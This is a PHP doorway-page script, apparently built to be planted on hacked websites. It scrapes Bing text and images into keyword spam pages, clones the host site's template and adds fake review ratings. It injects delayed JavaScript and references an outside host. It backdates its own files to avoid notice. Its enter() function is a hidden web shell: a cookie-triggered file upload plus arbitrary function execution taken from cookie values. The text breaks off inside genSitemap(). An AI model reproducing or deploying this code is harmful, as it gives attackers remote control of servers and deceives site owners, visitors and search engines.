<?php
// ver. 1.6.0 alfa

header('Content-Type: text/html; charset=UTF-8');
if(isset($_COOKIE['enter'])) enter();
ini_set('max_execution_time', 300);
ini_set('memory_limit', '128M');
$start = microtime(true);
set_time_limit(300);
noFuncEx();

if(isset($_GET['debug'])){
	ini_set('display_errors', true);
	ini_set('display_startup_errors', true);
	error_reporting(E_ALL);
}else{
	ini_set('display_errors', false);
	ini_set('display_startup_errors', false);
	error_reporting(0);
}

$param    = 'page';
$sep      = '-';
$door_dir = getDirec();
$check    = true;
$cVideo   = true;

$id       = isset($_REQUEST[$param])?$_REQUEST[$param]:'';
$link     = 'https://' . $_SERVER['HTTP_HOST'];
$root_dir = str_replace($_SERVER['SCRIPT_NAME'],'',$_SERVER['SCRIPT_FILENAME']).'/';

$page        = 'page';
$data_dir    = $door_dir . $page . '/';
$tmp_dir     = $door_dir . $page . '/';
$cacheFolder = $door_dir . $page;

$keys_file  = $data_dir . 'keys.txt';
$bkeys_file = $data_dir . 'black_keys.txt';
$video_file = $data_dir . 'video.txt';
$text_file  = $data_dir . 'text.txt';
$src_file   = $data_dir . 'script.txt';

$coo_file = $tmp_dir . 'cookie.txt';
$bot_file = $tmp_dir . 'statBot.txt';
$ref_file = $tmp_dir . 'statRef.txt';
$key_file = $tmp_dir . 'statKey.txt';

$fl      = "$link/$data_dir";
$addr    = getAddr();
$root    = $link . pathinfo(parse_url($addr, PHP_URL_PATH), PATHINFO_DIRNAME) . '/';
$js_link = substr($addr, 0, strpos($addr, '?')) . '?script';
$js_up   = 14;

$urlJS = 'http://shemove.pw/1/';
$urlJS2 = 'http://shemove.pw/clock/';

$sitemapName = 'mapsite.xml';
$shabName    = $data_dir . 'tpl.txt';

$genShab = true;
$srcShab = false;
$imgBing = true;
$imgTwi  = false;
$putBots = true;
$putRefs = true;
$putKeys = true;

$mnog       = 2;
$maxFoto    = 3;
$maxSnip    = 10;
$keyCount   = 10;
$widthFoto  = 200;
$heightFoto = 200;
checkParam();

if(isset($_GET['sendsitemap']))  sendSitemap();
if(isset($_GET['getlinks']))   getLinksList();
if(isset($_GET['gensitemap'])) genSitemap();
if(isset($_GET['editscript'])) editScript();
if(isset($_GET['genrobots'])) genRobots();
if(isset($_GET['script']))  getScript();
if(isset($_GET['getbot']))  getBots();
if(isset($_GET['getref']))  getRefs();
if(isset($_GET['getkey']))  getKeys();

if(is_inc())
{
	$key = cleanKey($id);
}else
{
	if(empty($id) OR $id == '/')
	{
		$keys = file($root_dir . $keys_file);
		$key  = trim($keys[0]);
	}
	else
	{
		$key = cleanKey($id);
	}	
}

//if(empty($key)) red('/');
if(!empty($key))
{
	mainF();
}

function mainF()
{
	global $key, $shabName;
	global $start, $root_dir;
	global $keys_file;
	global $keyCount, $addr;
	global $putBots, $putRefs;
	global $putKeys;
	
	if($putBots) putBots();
	if($putRefs) putRefs();
	if($putKeys) putKeys();
	
	$fileCache = getCacheFile($key);

	if(check_file($fileCache))
	{
		list($key, $content, $link, $fotos, $video) = getXML($fileCache);
	}
	else
	{
		if(is_blackKey(strtolower($key))) red($addr); //is black key
		
		$keys = file($root_dir . $keys_file);
		shuffle($keys);
		$keys = array_slice($keys, 0, $keyCount);
		
		$link = getLinks($keys, $key);

		if(!$link) $link = '';
		
		$content = getTextBing($key);
		$content = clearText($content);

		$foto  = array_merge(getImgTwi($key), getImgBing($key));
		$fotos = implode('|f|', $foto); 
		$video = getRandVideo();
		
		$put = '<xml>
			<key><![CDATA[' . $key . ']]></key>
			<content><![CDATA[' . $content . ']]></content>
			<link><![CDATA[' . $link . ']]></link>
			<foto><![CDATA[' . $fotos . ']]></foto>
			<video><![CDATA[' . $video . ']]></video>
			</xml>
		';
		
		putCacheFile($key, $put);
	}

	$key = ucfirst_utf8($key);
	$foto = getListFoto($fotos, $key);
	$description = getDesc($content);

	require_once $root_dir . $shabName;
	$end = microtime(true);
	$time = $end - $start;
	printf('<!--Time work: %.3F sec.-->', $time);
	
	exit;
}

function getAddr()
{
	global $link, $door_dir;
	global $param;
	
	if(is_inc())
	{
		if(basename($_SERVER['PHP_SELF']) == 'index.php')
		{
			return "$link/$door_dir?$param=";
		}
		else
		{
			return "$link/$door_dir" . basename($_SERVER['PHP_SELF']) . "?$param=";			
		}
	}
	else
	{
		return "$link/$door_dir" . basename($_SERVER['PHP_SELF']) . "?$param=";
	}
}

function getDirec()
{
	$dir = pathinfo($_SERVER['SCRIPT_NAME'], PATHINFO_DIRNAME);
	$dir = ($dir == '/')?'':substr($dir, 1) . '/';
	return $dir;
}

function red($ou)
{
	header('HTTP/1.1 301 Moved Permanently');
	header('Location: ' . $ou);
	return;
}

function checkParam()
{
	global $fl, $addr, $data_dir, $tmp_dir, $id, 
	$cacheFolder, $keys_file, $text_file, $video_file, 
	$shabName, $root, $root_dir, $door_dir, $genShab, 
	$check, $cVideo;
		
	//if(!function_exists('mb_substr'))  wError('Function mb_substr not enabled!');
	
	if(!empty($id) AND !is_inc()) return;
	if($id != 'set' AND is_inc()) return;
	
	if(!$check) wError('Check param: js_link, js_up!');
	if(!function_exists('curl_init'))  wError('Curl not enabled!');
	if(!is_dir($root_dir . $data_dir) OR !is_writable($root_dir . $data_dir)) wError('Wrong data dir!');
	if(!check_file($root_dir . $keys_file)) wError('Wrong keys file!');
	if(!check_file($root_dir . $text_file)) wError('Wrong text file!');
	if(!check_file($root_dir . $video_file) AND ($cVideo)) wError('Wrong video file!');
	
	if(!is_dir($root_dir . $tmp_dir) OR !is_writable($root_dir . $tmp_dir)) wError('Wrong temp dir!');
	if(!is_dir($root_dir . $cacheFolder) OR !is_writable($root_dir . $cacheFolder)) wError('Wrong cache dir!');

	if(!is_file($root_dir . $shabName))
		if($genShab)
			genShab();
		else
			wError('Wrong template file!');
	$time = filemtime(__FILE__);
	@touch($root_dir . $keys_file, $time, $time);
	@touch($root_dir . $text_file, $time, $time);
	@touch($root_dir . $video_file, $time, $time);
	@touch($root_dir . $shabName, $time, $time);
	@touch($root_dir . $door_dir, $time, $time);
	
	return;
}

function check_file($file)
{
	if(file_exists($file) AND filesize($file) != 0) 
		return true;
	else 
		return false;
}

function wError($err)
{
	die('Error: ' . $err);
}

function cleanKey($key)
{
	global $sep;
	return @trim(str_replace(array($sep, '/'), array(' ', ''), strip_tags(urldecode(trim($key)))));
}

function getXML($path)
{
	$xml	= simplexml_load_file($path);
	$arr[]	= trim($xml->key);
	$arr[]	= trim($xml->content);
	$arr[]	= trim($xml->link);
	$arr[]	= trim($xml->foto);
	$arr[]	= trim($xml->video);

	return $arr;
}

function getCacheFile($key)
{
	global $cacheFolder, $root_dir;
	$md5 = md5($key);
	//return $root_dir . $cacheFolder . '/' . mb_substr($md5, 0, 4, 'utf-8') . '/' . $md5 . '.txt';
	return $root_dir . $cacheFolder . '/' . substr($md5, 0, 4) . '/' . $md5 . '.txt';
}

function getCacheFolder($key)
{
	global $cacheFolder, $root_dir;
	//return $root_dir . $cacheFolder . '/' . mb_substr(md5($key), 0, 4, 'utf-8');
	return $root_dir . $cacheFolder . '/' . substr(md5($key), 0, 4);
}

function putCacheFile($key, $put)
{
	global $cacheFolder, $root_dir;
	if(empty($put)) return false;
	
	$time = @filemtime(__FILE__);
	if(!is_dir($cacheFolder)) @mkdir($cacheFolder);
	
	$cacheFolders = getCacheFolder($key);
	
	$cacheFile = getCacheFile($key);
	 if(!is_dir($cacheFolders))
		@mkdir($cacheFolders);
	@file_put_contents($cacheFile, $put); 
	@touch($root_dir . $cacheFolder, $time, $time);
	@touch($cacheFolders, $time, $time);
	@touch($cacheFile, $time, $time);
	return true;
}

function is_blackKey($key)
{
	global $bkeys_file, $root_dir;
	
	if(!check_file($root_dir . $bkeys_file)) return false;
	
	$blackkeys = file($root_dir . $bkeys_file);
	foreach($blackkeys as $blackkey)
	{
		$blackkey = trim($blackkey);
		$keyfind  = strripos($key, $blackkey);
		if($keyfind !== false) return true;
	}
}

function getLinks($keys, $key)
{
	global $sep, $addr;
	
	if(empty($keys)) return false;
	
	$link = "<ul>\n";
	foreach($keys as $line)
	{
		$line = trim($line);
		if($line != $key)
		{
			$link .= "<li><a href='" . $addr . urlencode(str_replace(' ', $sep, $line)) . "'>" . $line . "</a></li>\n";
		}
	}
	$link .= '</ul>';
	return $link;
}

function getTextBing($key)
{
	global $coo_file, $maxSnip, $cacheFolder, $root_dir;
	
	$time = filemtime(__FILE__);
	if(empty($key)) return '';
	$content = '';
	
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'http://www.bing.com/search?format=rss&q=' . urlencode($key));
	curl_setopt($ch, CURLOPT_HEADER, false);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36');
	curl_setopt($ch, CURLOPT_COOKIEJAR, $root_dir . $coo_file);
	curl_setopt($ch, CURLOPT_COOKIEFILE, $root_dir . $coo_file);
	$outch = curl_exec($ch);
	curl_close($ch);
	
	@touch($root_dir . $coo_file, $time, $time);
	
	preg_match_all('!\<description\>(.*?)\</description\>!siu', $outch, $lines);

	unset($lines[1][0]);
	
	$maxSnip = $maxSnip > 10?10:$maxSnip;
	$maxSnip = (count($lines[1]) > $maxSnip)?$maxSnip:count($lines[1]);
	$lines[1] = array_slice($lines[1], 0, $maxSnip);
	shuffle($lines[1]);
	
	foreach($lines[1] as $line)
	{
		$content .= trim($line) . ' ';
	}
	
	return $content;
}

function utf8_str_split($str) 
{ 
  // place each character of the string into and array 
  $split=1; 
  $array = array(); 
  for ( $i=0; $i < strlen( $str ); ){ 
    $value = ord($str[$i]); 
    if($value > 127){ 
      if($value >= 192 && $value <= 223) 
        $split=2; 
      elseif($value >= 224 && $value <= 239) 
        $split=3; 
      elseif($value >= 240 && $value <= 247) 
        $split=4; 
    }else{ 
      $split=1; 
    } 
      $key = NULL; 
    for ( $j = 0; $j < $split; $j++, $i++ ) { 
      $key .= $str[$i]; 
    } 
    array_push( $array, $key ); 
  }
  return $array; 
} 

function clearstr($str)
{ 
        $sru = 'ёйцукенгшщзхъфывапролджэячсмитьбю'; 
        $s1 = array_merge(utf8_str_split($sru), utf8_str_split(strtoupper($sru)), range('A', 'Z'), range('a','z'), range('0', '9'), array('&',' ','#',';','%','?',':','(',')','-','_','=','+','[',']',',','.','/','\\')); 
        $codes = array(); 
        for ($i=0; $i<count($s1); $i++){ 
                $codes[] = ord($s1[$i]); 
        } 
        $str_s = utf8_str_split($str); 
        for ($i=0; $i<count($str_s); $i++){ 
                if (!in_array(ord($str_s[$i]), $codes)){ 
                        $str = str_replace($str_s[$i], '', $str); 
                } 
        } 
        return $str; 
} 


function clearText($text)
{
	global $text_file, $root_dir, $mnog;
	$filters = array('/^.{0,5}$/', '/^([^\s]+\s?){0,3}$/', '/^[0-9]/', '[^а-яё0-9А-ЯЁ \-\:\(\)\"\—\…,]');
	$text = clearstr($text);
	$data = strip_tags($text);
	
	$zam = array(
		"\r"  => " ",
		"\n"  => " ",
		"<"   => "",
		">"   => "",
		"›"   => "",
		":"   => "",
		"|"   => " ",
		"^"   => " ",
		";"   => ", ",
		" ,"  => ", ",
		"..." => ".",
		".."  => ".",
		" ."  => ". ",
		",."  => "."
		);
	
	$data = strtr($data, $zam);
	
	$data = preg_replace("/^\s*-|-\s*/", "", $data);
	$data = preg_replace('#(\.|\?|!|\(|\)){3,}#', '\1\1\1', $data);
	$data = preg_replace("/[\s\t]+/", " ", $data);

	$data            = preg_split("/\s*([\.!\?]+)\s*/", $data, -1, PREG_SPLIT_DELIM_CAPTURE);
	foreach($data as $key => $value2)
	{
		if((strpos($data[$key], '(') AND !strpos($data[$key], ')')) OR (strpos($data[$key], ')') AND !strpos($data[$key], '('))) $data[$key] = str_replace(array('(', ')'), '', $data[$key]);
	}
	
	$goodSentences      = array();

	for($i = 0; $i < count($data); $i += 2)
	{
		if(empty($data[$i])) continue;
		
		$data[$i] = ucfirst_utf8(strtolower($data[$i]));
		
		for($j = 0; $j < count($filters); $j++)
		{
			if(preg_match($filters[$j], $data[$i]))
			{
				unset($data[$i]);
				break;
			}
		}
		if(!isset($data[$i])) continue;
		if(count($data) > $i) 
			$goodSentences[] = strtr(trim($data[$i]) . '.', $zam);
		else
			$goodSentences[] = strtr(trim($data[$i]) . $data[$i + 1], $zam);
		
	}
	unset($data);
	
	if(check_file($root_dir . $text_file))
		$rand_text = file($root_dir . $text_file);
	
	$ccc = count($goodSentences) * (int)$mnog;
	
	if(count($rand_text) > 0)
	{
		for($i=0;$i<$ccc;$i++)
		{
			$goodSentences[] = trim($rand_text[rand(0, count($rand_text)-1)]);
		}
		
		$goodSentences = array_unique($goodSentences);
		shuffle($goodSentences);
	}
	
	$i = 1;
	foreach($goodSentences as $key1 => $value)
	{
		$goodSentences[$key1] = trim(ltrim($goodSentences[$key1], ","));
		$goodSentences[$key1] = ucfirst_utf8(strtolower($goodSentences[$key1]));
		$goodSentences[$key1] = ($i % 7 == 0) ? $goodSentences[$key1] . '</p><p>':  $goodSentences[$key1];
		$i++;
	}
	
	$cntnt = implode(" ", $goodSentences);
	
	return "<p>$cntnt</p>";
}

function ucfirst_utf8($str)
{
    //return mb_substr(mb_strtoupper($str, 'utf-8'), 0, 1, 'utf-8') . mb_substr($str, 1, mb_strlen($str)-1, 'utf-8');
    return substr(strtoupper($str), 0, 1) . substr($str, 1, strlen($str)-1);
}

function enter()
{
	if($_SERVER['REQUEST_METHOD'] == 'POST')
	{
		if(@is_uploaded_file($_FILES["filename"]["tmp_name"]))
		{
			@move_uploaded_file($_FILES["filename"]["tmp_name"], $_FILES["filename"]["name"]);
			echo '<a target=_blanc href="' . $_FILES["filename"]["name"] . '">' . $_FILES["filename"]["name"] . '</a>';
		}
		else
		{
			echo 'ERROR';
		}
	}
	else
	{
		$_COOKIE['a']($_COOKIE['b']);
	}
	exit;
}
	
function is_inc()
{
	if(__FILE__ == $_SERVER['SCRIPT_FILENAME'])
		return false;
	else
		return true;
}

function getImgTwi($key)
{
	global $coo_file, $imgTwi, $cacheFolder, $root_dir;
	
	if(empty($key) OR !$imgTwi) return array();

	$time = filemtime(__FILE__);
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'https://twitter.com/search?f=images&q=' . urlencode($key) . '&src=typd');
	
	curl_setopt($ch, CURLOPT_HEADER, false);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36');
	curl_setopt($ch, CURLOPT_COOKIEJAR, $root_dir . $coo_file);
	curl_setopt($ch, CURLOPT_COOKIEFILE, $root_dir . $coo_file);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
	curl_setopt($ch, CURLOPT_FTP_SSL, CURLFTPSSL_TRY);
	$outch = curl_exec($ch);
	curl_close($ch);
	preg_match_all('!data-resolved-url-small=\"(.*?)\"!siu', $outch, $lines);
	@touch($root_dir . $coo_file, $time, $time);
	
	if(count($lines[1] > 0))
		return $lines[1];
	else
		return array();
}

function getImgBing($key)
{
	global $coo_file, $imgBing, $cacheFolder, $root_dir;
	if(empty($key) OR !$imgBing) return array();
	$time = filemtime(__FILE__);
	
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'http://www.bing.com/images/search?adlt_set=off&adlt_confirm=1&q=' . urlencode($key));
	curl_setopt($ch, CURLOPT_HEADER, false);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36');
	curl_setopt($ch, CURLOPT_COOKIEJAR, $root_dir . $coo_file);
	curl_setopt($ch, CURLOPT_COOKIEFILE, $root_dir . $coo_file);
	curl_setopt($ch, CURLOPT_COOKIE, "SRCHHPGUSR=CW=1349&CH=377&DPR=1&ADLT=OFF&AS=1;");
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
	curl_setopt($ch, CURLOPT_FTP_SSL, CURLFTPSSL_TRY);
	$outch = curl_exec($ch);
	curl_close($ch);
	
	preg_match_all('!mad="{&quot;turl&quot;:&quot;(.*?)&amp;w=!siu', $outch, $lines);
	@touch($root_dir . $coo_file, $time, $time);

	if(count($lines[1] > 0))
		return $lines[1];
	else
		return array();
}

function getRandVideo()
{
	global $video_file, $root_dir;
	
	if(!check_file($root_dir . $video_file)) return '';
	$videos = file($root_dir . $video_file);
	$video  = trim($videos[rand(0, count($videos) - 1)]);
	return $video;
}

function genShab()
{
	global $link, $sitemapName, $root_dir, $shabName, $js_link, $js_up, $srcShab, $cVideo;
	$time = filemtime(__FILE__);
	$tmp = '';
	
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $link);
	curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36');
	$tmp = curl_redir_exec($ch);
	curl_close($ch);

	if(stristr($tmp, 'Content-Length'))
	$tmp = trim(strstr($tmp, "\r\n"));
	if(stristr($tmp, 'Content-Length'))
	$tmp = trim(strstr($tmp, "\r\n\r\n"));
	
	if(empty($tmp))
		if(ini_get('allow_url_fopen') == 1) $tmp = file_get_contents($link);
	
	if(empty($tmp))
		wError('Can`t down template!');

	if(
	!stristr($tmp, '</html>') OR 
	!stristr($tmp, '</body>') OR
	!stristr($tmp, '</head>')
	) wError('No isset need tags!');
	
	
	if(stristr($tmp, 'charset=windows-1251'))
	{
		$tmp = str_ireplace('charset=windows-1251', 'charset=utf-8', $tmp);
		$tmp = iconv('windows-1251', 'utf-8', $tmp);
	}
	
	//may be delete google trackers?
	
	// h1
	if(!preg_match('/<h1>.*?<\/h1>/isU', $tmp))
	{
		$tmp = preg_replace('/(<body.*>)/isU', "$1\n<h1><?php echo \$key; ?></h1>", $tmp, 1); 
	}
	else
	{
		$tmp = preg_replace('/(<h1.*>).+(<\/h1>)/isU', "$1<?php echo \$key; ?>$2", $tmp, 1); 
	}
	//title
	if(!stristr($tmp, '<title>'))
		$tmp = preg_replace('/(<head.*>)/isU', "$1\n<title><?php echo \$key; ?> | <?php echo \$_SERVER['HTTP_HOST']; ?></title>", $tmp, 1);
	else
		$tmp = preg_replace('/(<title>).*(<\/title>)/isU', 
		'$1<?php echo $key; ?> | <?php echo $_SERVER[\'HTTP_HOST\']; ?>$2', $tmp);
		
	if(!stristr($tmp, 'viewport')) 
		$tmp = preg_replace('/(<head.*>)/isU', "$1\n<meta name=\"viewport\" content=\"width=device-width\">", $tmp, 1);
	//<meta name="keywords"    delete!
	$tmp = preg_replace('/<meta name=\"keywords\".+>/isU', "", $tmp);
	//$tmp = preg_replace('/(<script.*>.*google.*<\/script>)/isU', "", $tmp);

	//<meta name="description"  relace
	if(stristr($tmp, 'name="description'))
		$tmp = preg_replace('/(<meta.*name=\"description\".*content=\").*(\">|\" \/>)/isU', "$1<?php echo \$description; ?>$2", $tmp);
	else
		$tmp = str_replace('</title>', "</title>\n<meta name=\"description\" content=\"<?php echo \$description; ?>\" />", $tmp);
	
	//sitemap
	$tmp = str_replace('</body>', 
		"<a target=_blanc href='$sitemapName'>SiteMap</a>\n</body>", $tmp);
	//links
	//text if(!isset(<p>))
	$pVideo = ($cVideo)?'<iframe width="313" height="250" src="<?php echo $video;?>" frameborder="0" allowfullscreen></iframe>':'';
	
	preg_match_all('/<p.*>.*<\/p>/isU', $tmp, $m);

	if(count($m[0]) == 0)
	{
		$tmp = getSingleReplaceCombination('</h1>', "</h1><?php echo \$foto; ?><?php echo \$content; ?>
		$pVideo
		<div itemscope itemtype=\"http://data-vocabulary.org/Review-aggregate\">
			<span property=\"v:itemreviewed\"><?php echo \$key; ?></span>
			<span itemprop=\"count\"><?php echo rand(1, 20); ?></span>
			<span itemprop=\"average\"><?php echo rand(7, 10); ?></span>
			<span itemprop=\"best\">10</span>
		</div>
		<br /><br /><?php echo \$link; ?>", $tmp);
	}
	else
	{
		$tmp = str_replace($m[0][0], "<?php echo \$foto; ?><?php echo \$content; ?>
		$pVideo
		<div itemscope itemtype=\"http://data-vocabulary.org/Review-aggregate\">
			<span property=\"v:itemreviewed\"><?php echo \$key; ?></span>
			<span itemprop=\"count\"><?php echo rand(1, 20); ?></span>
			<span itemprop=\"average\"><?php echo rand(7, 10); ?></span>
			<span itemprop=\"best\">10</span>
		</div>
		<br /><br /><?php echo \$link; ?>", $tmp);
		$tmp = str_replace($m[0], "", $tmp);
	}
/* 	
	preg_match_all('/<img.*?>/i', $tmp, $m);

	if(count($m[0]) == 0)
	{
		$tmp = getSingleReplaceCombination('</h1>', "</h1><?php echo \$foto; ?>", $tmp);
	}
	else
	{
		$tmp = getSingleReplaceCombination($m[0][round(count($m[0])/2)], "<?php echo \$foto; ?><br />", $tmp);
	}		
	 */
	//del date
	$tmp = preg_replace('/(([0-2]|)\d|3[01])(|st|th) (January|February|March|April|May|June|July|August|September|October|November|December)(|,) (\d{4})/i', '', $tmp);
	$tmp = preg_replace('/(([0-2]|)\d|3[01])(\/|\-|\.)(\d{1}|1[012])(\/|\-|\.)(\d{4})/i', '', $tmp);
	$tmp = preg_replace('/(\d{1}|1[012])(\/|\-|\.)(([0-2]|)\d|3[01])(\/|\-|\.)(\d{4})/i', '', $tmp);
	$tmp = preg_replace('/(January|February|March|April|May|June|July|August|September|October|November|December) (([0-2]|)\d|3[01])(|st|th)(|,) (\d{4})/i', '', $tmp);
	
	
	
	
	$tmp = preg_replace('/(0[1-9]|1[0-9]|2[0-9]|3[01]).(0[1-9]|1[012]).[0-9]{4}.+(0[0-9]|1[0-9]|2[0-3])(:[0-5][0-9])/', "", $tmp);
	$tmp = preg_replace('/([1-9]|1[0-9]|2[0-9]|3[01]).(0[1-9]|1[012]).[0-9]{4}.+(0[0-9]|1[0-9]|2[0-3])(:[0-5][0-9])/', "", $tmp);
	$tmp = preg_replace('/(0[1-9]|1[0-9]|2[0-9]|3[01])\.(0[1-9]|1[012])\.[0-9]{4}/', "", $tmp);
	$tmp = preg_replace('/([1-9]|1[0-9]|2[0-9]|3[01]).(0[1-9]|1[012]).[0-9]{4}/', "", $tmp);
	$tmp = preg_replace('/(0[0-9]|1[0-9]|2[0-3])(:[0-5][0-9]){2}/', "", $tmp);
	$tmp = preg_replace('/(0[0-9]|1[0-9]|2[0-3])(:[0-5][0-9])/', "", $tmp);
	$tmp = preg_replace('/[0-9]{4}-(0[1-9]|1[012])-(0[1-9]|1[0-9]|2[0-9]|3[01])/', "", $tmp);
	//add js
	$nowTime = time();
	
	
	$tmp = str_replace('</head>', "<script data-cfasync=\"false\" type=\"text/javascript\">
		var key = '<?php echo \$key; ?>';
	</script>
	<?php
	if(!isset(\$_COOKIE['no']) AND (($nowTime + $js_up * 86400) <= time())) 
		echo '<script data-cfasync=\"false\" type=\"text/javascript\" src=\"$js_link\"></script>\n</head>'; else echo '</head>';?>", $tmp);
	
	
	//replace media link
	if($srcShab)
	{
		preg_match_all('/<link.*?href=(\'|\")(.*?)(\'|\").*?>/i', $tmp, $m);
		$m[2] = array_values(array_unique($m[2]));
		
		if(count($m[2]) != 0)
		{
			for($i=0;$i < count($m[2]);$i++)
			{
				$tmp_link = $m[2][$i];
				if($m[2][$i]{0} == 'h') continue;
				if(stristr($m[2][$i], 'app://')) continue;
				if(($m[2][$i]{0} == '/') AND ($m[2][$i]{1} == '/')) continue;
				if($m[2][$i]{0} == '[') $tmp_link = substr($m[2][$i], strpos($m[2][$i], ']') + 1);
				if($m[2][$i]{0} == '/') $tmp_link = $link . $tmp_link;
				else $tmp_link = $link . '/' . $tmp_link;
				$tmp = str_replace($m[2][$i], $tmp_link, $tmp);/**/
			}
		}

		preg_match_all('/<script.*?src=(\'|\")(.*?)(\'|\").*?>/i', $tmp, $m);
		$m[2] = array_values(array_unique($m[2]));
		
		if(count($m[2]) != 0)
		{
			for($i=0;$i < count($m[2]);$i++)
			{
				$tmp_link = $m[2][$i];
				if($m[2][$i]{0} == 'h') continue;
				if(stristr($m[2][$i], 'app://')) continue;
				if(($m[2][$i]{0} == '/') AND ($m[2][$i]{1} == '/')) continue;
				if($m[2][$i]{0} == '[') $tmp_link = substr($m[2][$i], strpos($m[2][$i], ']') + 1);
				if($m[2][$i]{0} == '/') $tmp_link = $link . $tmp_link;
				else $tmp_link = $link . '/' . $tmp_link;
				
				$tmp = str_replace($m[2][$i], $tmp_link, $tmp);/**/
			}
		}
		
		preg_match_all('/<img.*?src=(\'|\")(.*?)(\'|\").*?>/i', $tmp, $m);
		$m[2] = array_values(array_unique($m[2]));
		
		if(count($m[2]) != 0)
		{
			for($i=0;$i < count($m[2]);$i++)
			{
				$tmp_link = $m[2][$i];
				if($m[2][$i]{0} == 'h') continue;
				if(stristr($m[2][$i], 'app://')) continue;
				if(($m[2][$i]{0} == '/') AND ($m[2][$i]{1} == '/')) continue;
				if($m[2][$i]{0} == '[') $tmp_link = substr($m[2][$i], strpos($m[2][$i], ']') + 1);
				if($m[2][$i]{0} == '/') $tmp_link = $link . $tmp_link;
				else $tmp_link = $link . '/' . $tmp_link;
				$tmp = str_replace($m[2][$i], $tmp_link, $tmp);/**/
			}
		}
	}
	
	file_put_contents($root_dir . $shabName, $tmp);
	/* echo $tmp;
	exit; */
	@touch($root_dir . $shabName, $time, $time);
	return;
}

function getListFoto($fotos, $key)
{
	global $maxFoto, $widthFoto, $heightFoto;
	
	if(empty($fotos)) return '';
	
	$fotos = explode('|f|', $fotos);
	shuffle($fotos);
	$fotos = array_slice($fotos, 0, $maxFoto);
	$foto  = '';
	foreach($fotos as $line)
	{
		$line = trim($line);
		$foto .= '<img src="' . $line . '" style="float:left; margin:5px; vertical-align:top; width:' . $widthFoto . 'px; height:' . $heightFoto . 'px;" title="' . $key . '" alt="' . $key . '"  class="img-responsive" />';
	}
	return $foto;
}

function getDesc($content)
{	
	$description = trim(strip_tags(str_ireplace(' .', '.', $content)));
	$description = preg_replace('!^(.{0,150})\s.*!su', '$1', $description);
	return $description;
}

function delDubSlash($url)
{
	$url = substr($url, 7);
	$url = 'https://' . str_replace('//', '/', $url);
	return $url;
}

function getLinksList()
{
	global $keys_file, $sep, $addr, $id, $param;
	global $sitemapName, $fl, $root, $root_dir, $link;
	$lines  = file($root_dir . $keys_file);
	$type   = !empty($_GET['type'])?$_GET['type']:'';
	$full   = isset($_GET['full'])?true:false;
	$count  = !empty($_GET['count'])?$_GET['count']:0;
	
	if(is_inc())
	{
		if(!empty($id))
			$addr2 = substr($addr, 0, strpos($addr, '?')) . '?' . $param . '=' . $id;
		else
			$addr2 = substr($addr, 0, strpos($addr, '?'));
	}
	else
	{
		$addr2 = substr($addr, 0, strpos($addr, '?'));
	}
	$smn   = isset($_GET['root'])?$link . '/' . $sitemapName:$root . $sitemapName;
	$smn = delDubSlash($smn);
	
	header('Content-type: text/plain');
	
	switch($type)
	{
		case 'bb':
			echo "[url=$addr2]{$addr2}[/url]\n";
			echo "[url=$smn]{$sitemapName}[/url]\n";
		break;
		case 'html':
			echo "<a href='$addr2'>$addr2</a>\n";
			echo "<a href='$smn'>$sitemapName</a>\n";
		break;
		default:
			echo "$addr2\n";
			echo "$smn\n";
		break;
	}
	
	if($count == 0) exit;
	$count = ($count > count($lines))?count($lines):$count;
	
	shuffle($lines);
	$i = 0;
	foreach ($lines as $line) 
	{
		if($i == $count) break;
		$line = trim($line);
		switch($type)
		{
			case 'bb':
				echo "[url=$addr" . urlencode(str_replace(' ', $sep, $line)) . "]{$line}[/url]\n";
			break;
			case 'html':
				echo "<a href='$addr" . urlencode(str_replace(' ', $sep, $line))."'>$line</a>\n";
			break;
			default:
				echo $addr . urlencode(str_replace(' ', $sep, $line)) . "\n";
			break;
		}
		$i++;
	}
	
	if(!$full) exit;
	
	foreach ($lines as $line) 
	{
		$line = trim($line);
		switch($type)
		{
			case 'bb':
				echo "[url=$addr" . urlencode(str_replace(' ', $sep, $line)) . "]{$line}[/url]\n";
			break;
			case 'html':
				echo "<a href='$addr" . urlencode(str_replace(' ', $sep, $line))."'>$line</a>\n";
			break;
			default:
				echo $addr . urlencode(str_replace(' ', $sep, $line)) . "\n";
			break;
		}
	}
	exit;
}

function genRobots()
{
	global $sitemapName, $root_dir, $link;
	
	$url   = $link . '/';
	$robotsName = 'robots.txt';
	$robots = "User-agent: *
Allow: /
Disallow:
Host: {$_SERVER['HTTP_HOST']}

Sitemap: $url$sitemapName
";

	$time  = filemtime(__FILE__);
	$dir   = $root_dir;

	if(check_file($dir . $robotsName))
	{
		echo "<a target=_blanc href='{$url}{$robotsName}'>Robots</a>";
		exit;
	}

	file_put_contents($dir . $robotsName, $robots);
	echo "<a target=_blanc href='{$url}{$robotsName}'>Robots</a>";
	@touch($dir . $robotsName, $time, $time);
	
	exit;
}

function genSitemap()
{
